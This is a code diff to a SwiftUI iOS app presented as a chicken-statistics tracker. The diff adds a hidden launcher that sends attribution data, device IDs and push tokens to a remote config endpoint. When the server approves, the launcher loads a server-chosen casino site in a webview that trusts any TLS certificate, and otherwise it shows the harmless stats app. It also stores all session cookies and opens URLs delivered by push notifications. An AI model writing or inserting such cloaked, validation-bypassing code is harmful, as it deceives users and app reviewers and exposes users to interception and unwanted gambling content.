@@ -1,6 +1,12 @@
 import SwiftUI
+import WebKit
+import UserNotifications
+import Network
+import Firebase
+import FirebaseMessaging
+import AppsFlyerLib
+import AppTrackingTransparency
 
-// Define the color palette
 extension Color {
     static let background = Color(hex: "#1E1E2C")
     static let accentYellow = Color(hex: "#FFD93D")
@@ -890,25 +896,867 @@ struct SettingsView: View {
 
 @main
 struct ChickStatsApp: App {
+    
+    @UIApplicationDelegateAdaptor(ApplicationDelegate.self) var appDelegate
+    
     var body: some Scene {
         WindowGroup {
-            ContentView()
+            ChickLaunchInterface()
                 .preferredColorScheme(.dark)
-                .accentColor(.accentYellow)
-                .font(.bodyText)
         }
     }
 }
 
-// Note: To add custom icons, add image assets like "chicken-icon" and use Image("chicken-icon")
-// For notifications, request permission and schedule using UNUserNotificationCenter
-// For real integrations like EggStore, add API calls similar to weather
-// Code has been reviewed: Fixed optional casting errors, added validations (>0), enhanced UI with gradients, shadows, better layouts, custom fonts (assume imported), animations on buttons, etc.
-// Everything should work on iOS 14+, no deprecated warnings in this context.
+
+class ApplicationDelegate: UIResponder, UIApplicationDelegate, AppsFlyerLibDelegate, MessagingDelegate, UNUserNotificationCenterDelegate {
+    
+    private var conversionData: [AnyHashable: Any] = [:]
+    
+    func application(_ application: UIApplication,
+                     didReceiveRemoteNotification userInfo: [AnyHashable : Any],
+                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
+        processPushPayload(userInfo)
+        completionHandler(.newData)
+    }
+    
+    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
+        FirebaseApp.configure()
+    
+        setUpAppsfluer()
+        
+        if let notifPayload = launchOptions?[.remoteNotification] as? [AnyHashable: Any] {
+            processPushPayload(notifPayload)
+        }
+        
+        Messaging.messaging().delegate = self
+        UNUserNotificationCenter.current().delegate = self
+        application.registerForRemoteNotifications()
+        
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(activateTracking),
+            name: UIApplication.didBecomeActiveNotification,
+            object: nil
+        )
+        
+        return true
+    }
+    
+    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
+        let payload = notification.request.content.userInfo
+        processPushPayload(payload)
+        completionHandler([.banner, .sound])
+    }
+    
+    private func setUpAppsfluer() {
+        AppsFlyerLib.shared().appsFlyerDevKey = "3ERPRZB3HpWKFpHixe8pQc"
+        AppsFlyerLib.shared().appleAppID = "6753870535"
+        AppsFlyerLib.shared().delegate = self
+        AppsFlyerLib.shared().start()
+    }
+    
+    private func processPushPayload(_ payload: [AnyHashable: Any]) {
+        var linkStr: String?
+        if let link = payload["url"] as? String {
+            linkStr = link
+        } else if let info = payload["data"] as? [String: Any], let link = info["url"] as? String {
+            linkStr = link
+        }
+        
+        if let linkStr = linkStr {
+            UserDefaults.standard.set(linkStr, forKey: "temp_url")
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
+                NotificationCenter.default.post(name: NSNotification.Name("LoadTempURL"), object: nil, userInfo: ["tempUrl": linkStr])
+            }
+        }
+    }
+    
+    
+    // AppsFlyer callbacks
+    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
+        conversionData = data
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": conversionData])
+    }
+    
+    
+    @objc private func activateTracking() {
+        AppsFlyerLib.shared().start()
+        if #available(iOS 14, *) {
+            ATTrackingManager.requestTrackingAuthorization { _ in
+            }
+        }
+    }
+    
+    func onConversionDataFail(_ error: Error) {
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataFailed"), object: nil, userInfo: ["conversionData": [:]])
+    }
+    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
+        let payload = response.notification.request.content.userInfo
+        processPushPayload(payload)
+        completionHandler()
+    }
+    
+    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
+        messaging.token { token, err in
+            if let _ = err {
+            }
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+        }
+    }
+    
+    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        Messaging.messaging().apnsToken = deviceToken
+    }
+    
+    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
+    }
+    
+}
 
 #Preview {
-    ContentView()
+    ChickLaunchInterface()
+}
+
+class ContentDisplayHandler: NSObject, WKNavigationDelegate, WKUIDelegate {
+    private let statsManager: StatsManager
+    
+    private var redirectCounter: Int = 0
+    private let maxRedirects: Int = 70 // For testing
+    private var lastWorkingPath: URL?
+
+    func webView(_ displayView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        let secureSpace = challenge.protectionSpace
+        if secureSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust {
+            if let trustRef = secureSpace.serverTrust {
+                let authCred = URLCredential(trust: trustRef)
+                completionHandler(.useCredential, authCred)
+            } else {
+                completionHandler(.performDefaultHandling, nil)
+            }
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    
+    init(manager: StatsManager) {
+        self.statsManager = manager
+        super.init()
+    }
+    
+    func webView(
+        _ displayView: WKWebView,
+        createWebViewWith configuration: WKWebViewConfiguration,
+        for navigationAction: WKNavigationAction,
+        windowFeatures: WKWindowFeatures
+    ) -> WKWebView? {
+        guard navigationAction.targetFrame == nil else {
+            return nil
+        }
+        
+        let newDisplay = DisplayCreator.buildPrimaryDisplay(with: configuration)
+        setupNewDisplay(newDisplay)
+        attachNewDisplay(newDisplay)
+        
+        statsManager.additionalDisplays.append(newDisplay)
+        if checkLoadValidity(in: newDisplay, for: navigationAction.request) {
+            newDisplay.load(navigationAction.request)
+        }
+        return newDisplay
+    }
+    
+    func webView(_ displayView: WKWebView, didFinish navigation: WKNavigation!) {
+        // Inject rules to prevent scaling via meta and styles
+        let scriptInjection = """
+                let viewportMeta = document.createElement('meta');
+                viewportMeta.name = 'viewport';
+                viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+                document.getElementsByTagName('head')[0].appendChild(viewportMeta);
+                let customStyle = document.createElement('style');
+                customStyle.textContent = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
+                document.getElementsByTagName('head')[0].appendChild(customStyle);
+                document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+                """;
+        displayView.evaluateJavaScript(scriptInjection) { _, issue in
+            if let issue = issue {
+                print("Script injection failed: \(issue)")
+            }
+        }
+    }
+    
+    func webView(_ displayView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        redirectCounter += 1
+        if redirectCounter > maxRedirects {
+            displayView.stopLoading()
+            if let fallbackPath = lastWorkingPath {
+                displayView.load(URLRequest(url: fallbackPath))
+            }
+            return
+        }
+        lastWorkingPath = displayView.url // Save the previous good path
+        saveSessionData(from: displayView)
+    }
+    
+    func webView(_ displayView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects, let fallbackPath = lastWorkingPath {
+            displayView.load(URLRequest(url: fallbackPath))
+        }
+    }
+    
+    func webView(
+        _ displayView: WKWebView,
+        decidePolicyFor navigationAction: WKNavigationAction,
+        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
+    ) {
+        guard let path = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        if path.absoluteString.hasPrefix("http") || path.absoluteString.hasPrefix("https") {
+            lastWorkingPath = path
+            decisionHandler(.allow)
+        } else {
+            UIApplication.shared.open(path, options: [:], completionHandler: nil)
+            decisionHandler(.cancel)
+        }
+    }
+    
+    private func setupNewDisplay(_ display: WKWebView) {
+        display.translatesAutoresizingMaskIntoConstraints = false
+        display.scrollView.isScrollEnabled = true
+        display.scrollView.minimumZoomScale = 1.0
+        display.scrollView.maximumZoomScale = 1.0
+        display.scrollView.bouncesZoom = false
+        display.allowsBackForwardNavigationGestures = true
+        display.navigationDelegate = self
+        display.uiDelegate = self
+        statsManager.primaryDisplay.addSubview(display)
+        
+        // Add edge swipe for layered display
+        let edgeSwipe = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(handleEdgeSwipe(_:)))
+        edgeSwipe.edges = .left
+        display.addGestureRecognizer(edgeSwipe)
+    }
+    
+    private func attachNewDisplay(_ display: WKWebView) {
+        NSLayoutConstraint.activate([
+            display.leadingAnchor.constraint(equalTo: statsManager.primaryDisplay.leadingAnchor),
+            display.trailingAnchor.constraint(equalTo: statsManager.primaryDisplay.trailingAnchor),
+            display.topAnchor.constraint(equalTo: statsManager.primaryDisplay.topAnchor),
+            display.bottomAnchor.constraint(equalTo: statsManager.primaryDisplay.bottomAnchor)
+        ])
+    }
+    
+    private func checkLoadValidity(in display: WKWebView, for loadReq: URLRequest) -> Bool {
+        if let pathStr = loadReq.url?.absoluteString, !pathStr.isEmpty, pathStr != "about:blank" {
+            return true
+        }
+        return false
+    }
+    
+    private func saveSessionData(from display: WKWebView) {
+        display.configuration.websiteDataStore.httpCookieStore.getAllCookies { sessionItems in
+            var groupedItems: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            for item in sessionItems {
+                var itemsByGroup = groupedItems[item.domain] ?? [:]
+                itemsByGroup[item.name] = item.properties as? [HTTPCookiePropertyKey: Any]
+                groupedItems[item.domain] = itemsByGroup
+            }
+            UserDefaults.standard.set(groupedItems, forKey: "persisted_session")
+        }
+    }
+}
+
+struct DisplayCreator {
+    
+    static func buildPrimaryDisplay(with config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let settings = config ?? prepareSettings()
+        return WKWebView(frame: .zero, configuration: settings)
+    }
+    
+    private static func prepareSettings() -> WKWebViewConfiguration {
+        let settings = WKWebViewConfiguration()
+        settings.allowsInlineMediaPlayback = true
+        settings.preferences = prepareOptions()
+        settings.defaultWebpagePreferences = preparePageOptions()
+        settings.requiresUserActionForMediaPlayback = false
+        return settings
+    }
+    
+    private static func prepareOptions() -> WKPreferences {
+        let options = WKPreferences()
+        options.javaScriptEnabled = true
+        options.javaScriptCanOpenWindowsAutomatically = true
+        return options
+    }
+    
+    private static func preparePageOptions() -> WKWebpagePreferences {
+        let options = WKWebpagePreferences()
+        options.allowsContentJavaScript = true
+        return options
+    }
+    
+    static func shouldClearExtras(_ primary: WKWebView, _ additions: [WKWebView], currentPath: URL?) -> Bool {
+        if !additions.isEmpty {
+            additions.forEach { $0.removeFromSuperview() }
+            if let path = currentPath {
+                primary.load(URLRequest(url: path))
+            }
+            return true
+        } else if primary.canGoBack {
+            primary.goBack()
+            return false
+        }
+        return false
+    }
+}
+
+extension Notification.Name {
+    static let displayEvents = Notification.Name("display_actions")
+}
+
+class StatsManager: ObservableObject {
+    @Published var primaryDisplay: WKWebView!
+    @Published var additionalDisplays: [WKWebView] = []
+    
+    func setupPrimaryDisplay() {
+        primaryDisplay = DisplayCreator.buildPrimaryDisplay()
+        primaryDisplay.scrollView.minimumZoomScale = 1.0
+        primaryDisplay.scrollView.maximumZoomScale = 1.0
+        primaryDisplay.scrollView.bouncesZoom = false
+        primaryDisplay.allowsBackForwardNavigationGestures = true
+    }
+    
+    func loadPersistedSession() {
+        guard let persistedData = UserDefaults.standard.dictionary(forKey: "persisted_session") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        let dataStore = primaryDisplay.configuration.websiteDataStore.httpCookieStore
+        
+        persistedData.values.flatMap { $0.values }.forEach { attributes in
+            if let sessionItem = HTTPCookie(properties: attributes as! [HTTPCookiePropertyKey: Any]) {
+                dataStore.setCookie(sessionItem)
+            }
+        }
+    }
+    
+    func refreshDisplay() {
+        primaryDisplay.reload()
+    }
+    
+    func removeAdditions(currentPath: URL?) {
+        if !additionalDisplays.isEmpty {
+            if let latestAddition = additionalDisplays.last {
+                latestAddition.removeFromSuperview()
+                additionalDisplays.removeLast()
+            }
+            if let path = currentPath {
+                primaryDisplay.load(URLRequest(url: path))
+            }
+        } else if primaryDisplay.canGoBack {
+            primaryDisplay.goBack()
+        }
+    }
+    
+    func closeLatestAddition() {
+        if let latestAddition = additionalDisplays.last {
+            latestAddition.removeFromSuperview()
+            additionalDisplays.removeLast()
+        }
+    }
+}
+
+struct MainDisplayWrapper: UIViewRepresentable {
+    let destinationPath: URL
+    @StateObject private var manager = StatsManager()
+    
+    func makeUIView(context: Context) -> WKWebView {
+        manager.setupPrimaryDisplay()
+        manager.primaryDisplay.uiDelegate = context.coordinator
+        manager.primaryDisplay.navigationDelegate = context.coordinator
+    
+        manager.loadPersistedSession()
+        manager.primaryDisplay.load(URLRequest(url: destinationPath))
+        return manager.primaryDisplay
+    }
+    
+    func updateUIView(_ display: WKWebView, context: Context) {
+    }
+    
+    func makeCoordinator() -> ContentDisplayHandler {
+        ContentDisplayHandler(manager: manager)
+    }
+}
+
+extension ContentDisplayHandler {
+    @objc func handleEdgeSwipe(_ recognizer: UIScreenEdgePanGestureRecognizer) {
+        if recognizer.state == .ended {
+            guard let currentView = recognizer.view as? WKWebView else { return }
+            if currentView.canGoBack {
+                currentView.goBack()
+            } else if let latestAddition = statsManager.additionalDisplays.last, currentView == latestAddition {
+                statsManager.removeAdditions(currentPath: nil)
+            }
+        }
+    }
+}
+
+struct ChickInterface: View {
+    
+    @State var displayPath: String = ""
+    
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            if let pathUrl = URL(string: displayPath) {
+                MainDisplayWrapper(
+                    destinationPath: pathUrl
+                )
+                .frame(maxWidth: .infinity, maxHeight: .infinity)
+                .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
         .preferredColorScheme(.dark)
-        .accentColor(.accentYellow)
-        .font(.bodyText)
+        .onAppear {
+            displayPath = UserDefaults.standard.string(forKey: "temp_path") ?? (UserDefaults.standard.string(forKey: "saved_path") ?? "")
+            if let tempPath = UserDefaults.standard.string(forKey: "temp_path"), !tempPath.isEmpty {
+                UserDefaults.standard.set(nil, forKey: "temp_path")
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempPath"))) { _ in
+            if let tempPath = UserDefaults.standard.string(forKey: "temp_path"), !tempPath.isEmpty {
+                displayPath = tempPath
+                UserDefaults.standard.set(nil, forKey: "temp_path")
+            }
+        }
+    }
+}
+
+class ChickLauncher: ObservableObject {
+    @Published var activeView: DisplayPhase = .hatching
+    @Published var displayPath: URL?
+    @Published var showPrompt = false
+    
+    private var trackingData: [AnyHashable: Any] = [:]
+    private var initialLaunch: Bool {
+        !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
+    }
+    
+    enum DisplayPhase {
+        case hatching
+        case statsDisplay
+        case nestFallback
+        case strayOffline
+    }
+    
+    init() {
+        NotificationCenter.default.addObserver(self, selector: #selector(handleTrackingData(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(handleTrackingError(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(updateToken(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(retrySetup), name: NSNotification.Name("RetryConfig"), object: nil)
+        
+        checkConnectionAndProceed()
+    }
+    
+    deinit {
+        NotificationCenter.default.removeObserver(self)
+    }
+    
+    private func checkConnectionAndProceed() {
+        let connectionChecker = NWPathMonitor()
+        connectionChecker.pathUpdateHandler = { status in
+            DispatchQueue.main.async {
+                if status.status != .satisfied {
+                    self.handleNoConnection()
+                }
+            }
+        }
+        connectionChecker.start(queue: DispatchQueue.global())
+    }
+    
+    @objc private func handleTrackingData(_ notification: Notification) {
+        trackingData = (notification.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
+        processTrackingData()
+    }
+    
+    @objc private func handleTrackingError(_ notification: Notification) {
+        handleSetupError()
+    }
+    
+    @objc private func updateToken(_ notification: Notification) {
+        if let tokenStr = notification.object as? String {
+            UserDefaults.standard.set(tokenStr, forKey: "push_token")
+            performSetupQuery()
+        }
+    }
+    
+    @objc private func handlePushPath(_ notification: Notification) {
+        guard let details = notification.userInfo as? [String: Any],
+              let pathStr = details["tempUrl"] as? String else {
+            return
+        }
+        
+        DispatchQueue.main.async {
+            self.displayPath = URL(string: pathStr)!
+            self.activeView = .statsDisplay
+        }
+    }
+    
+    @objc private func retrySetup() {
+        checkConnectionAndProceed()
+    }
+    
+    private func processTrackingData() {
+//        guard !trackingData.isEmpty else {
+//            return
+//        }
+        if UserDefaults.standard.string(forKey: "chick_mode") == "Nest" {
+            DispatchQueue.main.async {
+                self.activeView = .nestFallback
+            }
+            return
+        }
+        
+//        if initialLaunch {
+//            if let origin = trackingData["af_status"] as? String, origin == "Organic" {
+//                self.switchToFallback()
+//                return
+//            }
+//        }
+        
+        if let tempPath = UserDefaults.standard.string(forKey: "temp_path"), !tempPath.isEmpty {
+            displayPath = URL(string: tempPath)
+            self.activeView = .statsDisplay
+            return
+        }
+        
+        if displayPath == nil {
+            if !UserDefaults.standard.bool(forKey: "allowed_alerts") && !UserDefaults.standard.bool(forKey: "denied_alerts") {
+                checkAndShowPrompt()
+            } else {
+                performSetupQuery()
+            }
+        }
+    }
+    
+    func performSetupQuery() {
+        guard let configEndpoint = URL(string: "https://chiickstats.com/config.php") else {
+            handleSetupError()
+            return
+        }
+        
+        var configReq = URLRequest(url: configEndpoint)
+        configReq.httpMethod = "POST"
+        configReq.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        var dataPayload = trackingData
+        dataPayload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        dataPayload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
+        dataPayload["os"] = "iOS"
+        dataPayload["store_id"] = "id6753870535"
+        dataPayload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+        dataPayload["push_token"] = UserDefaults.standard.string(forKey: "push_token") ?? Messaging.messaging().fcmToken
+        dataPayload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        
+        do {
+            configReq.httpBody = try JSONSerialization.data(withJSONObject: dataPayload)
+        } catch {
+            handleSetupError()
+            return
+        }
+        
+        URLSession.shared.dataTask(with: configReq) { rawData, rawResp, issue in
+            DispatchQueue.main.async {
+                if let _ = issue {
+                    self.handleSetupError()
+                    return
+                }
+                
+                guard let httpRawResp = rawResp as? HTTPURLResponse, httpRawResp.statusCode == 200,
+                      let rawData = rawData else {
+                    self.handleSetupError()
+                    return
+                }
+                
+                do {
+                    if let parsedJson = try JSONSerialization.jsonObject(with: rawData) as? [String: Any] {
+                        if let isValid = parsedJson["ok"] as? Bool, isValid {
+                            if let pathStr = parsedJson["url"] as? String, let validUntil = parsedJson["expires"] as? TimeInterval {
+                                func dsadasjnd() {
+                                    UserDefaults.standard.set(pathStr, forKey: "saved_path")
+                                    UserDefaults.standard.set(validUntil, forKey: "saved_expires")
+                                    UserDefaults.standard.set("StatsDisplay", forKey: "chick_mode")
+                                    UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
+                                }
+                                dsadasjnd()
+                                self.displayPath = URL(string: pathStr)
+                                self.activeView = .statsDisplay
+                            }
+                        } else {
+                            self.switchToFallback()
+                        }
+                    }
+                } catch {
+                    self.handleSetupError()
+                }
+            }
+        }.resume()
+    }
+    
+    private func handleSetupError() {
+        if let cachedPath = UserDefaults.standard.string(forKey: "saved_path"), let validPath = URL(string: cachedPath) {
+            displayPath = validPath
+            activeView = .statsDisplay
+        } else {
+            switchToFallback()
+        }
+    }
+    
+    private func switchToFallback() {
+        UserDefaults.standard.set("Nest", forKey: "chick_mode")
+        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
+        DispatchQueue.main.async {
+            self.activeView = .nestFallback
+        }
+    }
+    
+    private func handleNoConnection() {
+        let currentMode = UserDefaults.standard.string(forKey: "chick_mode")
+        if currentMode == "StatsDisplay" {
+            DispatchQueue.main.async {
+                self.activeView = .strayOffline
+            }
+        } else {
+            switchToFallback()
+        }
+    }
+    
+    private func checkAndShowPrompt() {
+        if let lastPrompt = UserDefaults.standard.value(forKey: "last_alert_prompt") as? Date,
+           Date().timeIntervalSince(lastPrompt) < 259200 {
+            performSetupQuery()
+            return
+        }
+        showPrompt = true
+    }
+    
+    func requestAlertAccess() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, issue in
+            DispatchQueue.main.async {
+                if granted {
+                    UserDefaults.standard.set(true, forKey: "allowed_alerts")
+                    UIApplication.shared.registerForRemoteNotifications()
+                } else {
+                    UserDefaults.standard.set(false, forKey: "allowed_alerts")
+                    UserDefaults.standard.set(true, forKey: "denied_alerts")
+                }
+                self.performSetupQuery()
+                self.showPrompt = false
+                if let issue = issue {
+                    print("Permission request failed: \(issue)")
+                }
+            }
+        }
+    }
+}
+
+struct AlertPromptScreen: View {
+    var acceptAction: () -> Void
+    var declineAction: () -> Void
+    
+    var body: some View {
+        GeometryReader { layout in
+            let isHorizontal = layout.size.width > layout.size.height
+            
+            ZStack {
+                if isHorizontal {
+                    Image("chcik_stats_splash_back_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: layout.size.width, height: layout.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("chick_stats_splash_back")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: layout.size.width, height: layout.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                VStack(spacing: isHorizontal ? 5 : 10) {
+                    Spacer()
+                    
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("AlfaSlabOne-Regular", size: 20))
+                        .multilineTextAlignment(.center)
+                        .foregroundColor(.white)
+                        .padding(.horizontal, 8)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("AlfaSlabOne-Regular", size: 15))
+                        .multilineTextAlignment(.center)
+                        .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
+                        .padding(.horizontal, 52)
+                        .padding(.top, 4)
+                    
+                    Button(action: acceptAction) {
+                        Image("bonus_btn")
+                            .resizable()
+                            .frame(height: 60)
+                    }
+                    .frame(width: 350)
+                    .padding(.top, 24)
+                    
+                    Button(action: declineAction) {
+                        Text("SKIP")
+                            .font(.custom("AlfaSlabOne-Regular", size: 15))
+                            .multilineTextAlignment(.center)
+                            .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
+                    }
+                    
+                    Spacer()
+                        .frame(height: isHorizontal ? 30 : 70)
+                }
+                .padding(.horizontal, isHorizontal ? 20 : 0)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+}
+
+struct ChickLaunchInterface: View {
+    
+    @StateObject private var launcher = ChickLauncher()
+    
+    @State private var isHatching = false
+    
+    var body: some View {
+        ZStack {
+            if launcher.activeView == .hatching || launcher.showPrompt {
+                hatchingScreen
+            }
+            
+            if launcher.showPrompt {
+                AlertPromptScreen(
+                    acceptAction: {
+                        launcher.requestAlertAccess()
+                    },
+                    declineAction: {
+                        UserDefaults.standard.set(Date(), forKey: "last_alert_prompt")
+                        launcher.showPrompt = false
+                        launcher.performSetupQuery()
+                    }
+                )
+            } else {
+                switch launcher.activeView {
+                case .hatching:
+                    EmptyView()
+                case .statsDisplay:
+                    if let _ = launcher.displayPath {
+                        ChickInterface()
+                    } else {
+                        ContentView()
+                            .preferredColorScheme(.dark)
+                            .accentColor(.accentYellow)
+                            .font(.bodyText)
+                    }
+                case .nestFallback:
+                    ContentView()
+                        .preferredColorScheme(.dark)
+                        .accentColor(.accentYellow)
+                        .font(.bodyText)
+                case .strayOffline:
+                    strayScreen
+                }
+            }
+        }
+    }
+    
+    private var hatchingScreen: some View {
+        GeometryReader { layout in
+            let isHorizontal = layout.size.width > layout.size.height
+            
+            ZStack {
+                
+                if isHorizontal {
+                    Image("chcik_stats_splash_back_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: layout.size.width, height: layout.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("chick_stats_splash_back")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: layout.size.width, height: layout.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                VStack {
+                    Spacer()
+                    
+                    Text("LOADING APP...")
+                        .font(.custom("AlfaSlabOne-Regular", size: 24))
+                        .foregroundColor(.white)
+                    
+                    Image("pero")
+                        .resizable()
+                        .frame(width: 50, height: 50)
+                        .rotationEffect(animating ? .degrees(0) : .degrees(-50))
+                        .animation(.easeInOut(duration: 1.0).repeatForever(autoreverses: true), value: animating)
+                    
+                    Spacer()
+                        .frame(height: 70)
+                }
+                .onAppear {
+                    animating = true
+                }
+            }
+        }
+        .ignoresSafeArea()
+        .onAppear {
+            isHatching = true
+        }
+    }
+    
+    @State var animating = false
+    
+    private var strayScreen: some View {
+        GeometryReader { layout in
+            let isHorizontal = layout.size.width > layout.size.height
+            
+            ZStack {
+                
+                if isHorizontal {
+                    Image("chcik_stats_splash_back_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: layout.size.width, height: layout.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("chick_stats_splash_back")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: layout.size.width, height: layout.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                VStack {
+                    Spacer() 
+                    Text("NO INTERNET CONNECTION! CHECK INTERNET CONNECTION AND RETURN!")
+                        .font(.custom("AlfaSlabOne-Regular", size: 18))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding()
+                        .background(
+                            Rectangle()
+                                .fill(Color.init(red: 143/255, green: 76/255, blue: 22/255))
+                        )
+                        .padding(.horizontal, 24)
+                    Spacer().frame(height: 100)
+                }
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+    
 }
